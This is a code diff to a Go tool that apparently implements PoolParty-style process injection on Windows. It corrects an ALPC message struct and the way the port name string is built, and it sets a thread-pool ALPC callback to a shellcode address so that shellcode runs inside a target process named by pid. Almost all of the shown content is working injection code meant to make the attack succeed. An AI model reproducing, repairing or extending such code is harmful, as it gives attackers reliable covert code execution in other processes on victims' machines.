@@ -352,7 +352,8 @@ type PORT_MESSAGE struct {
 	DataInfoOffset uint16
 	ClientId       [16]byte // CLIENT_ID (two uintptrs)
 	MessageId      uint32
-	CallbackId     uint32
+	_              [4]byte  // padding for 8-byte alignment
+	ClientViewSize uintptr  // SIZE_T (union with CallbackId, takes larger size)
 }
 
 // ALPC_MESSAGE structure - for variant 5
@@ -1302,14 +1303,20 @@ func executeVariant5(shellcode []byte, pid uint32) (string, error) {
 	}
 	output += "[+] Created TP_ALPC structure associated with shellcode\n"
 
+	// Explicitly set the Direct.Callback to shellcode address (similar to variant 4)
+	pAlpcStruct := (*FULL_TP_ALPC)(unsafe.Pointer(pTpAlpc))
+	pAlpcStruct.Direct.Callback = shellcodeAddr
+	output += "[+] Set Direct.Callback to shellcode address\n"
+
 	// Step 7: Generate random ALPC port name
 	portName := fmt.Sprintf("\\RPC Control\\PoolParty%d", pid)
 	portNameUTF16, _ := windows.UTF16FromString(portName)
 
 	// Create UNICODE_STRING for port name
+	// Length = bytes excluding null terminator, MaximumLength = bytes including null terminator
 	var usPortName UNICODE_STRING
-	usPortName.Length = uint16(len(portName) * 2)
-	usPortName.MaximumLength = usPortName.Length + 2
+	usPortName.Length = uint16((len(portNameUTF16) - 1) * 2)        // UTF-16 code units (minus null) * 2 bytes each
+	usPortName.MaximumLength = uint16(len(portNameUTF16) * 2)       // Full buffer size in bytes
 	usPortName.Buffer = &portNameUTF16[0]
 
 	// Step 8: Create the actual ALPC port with attributes
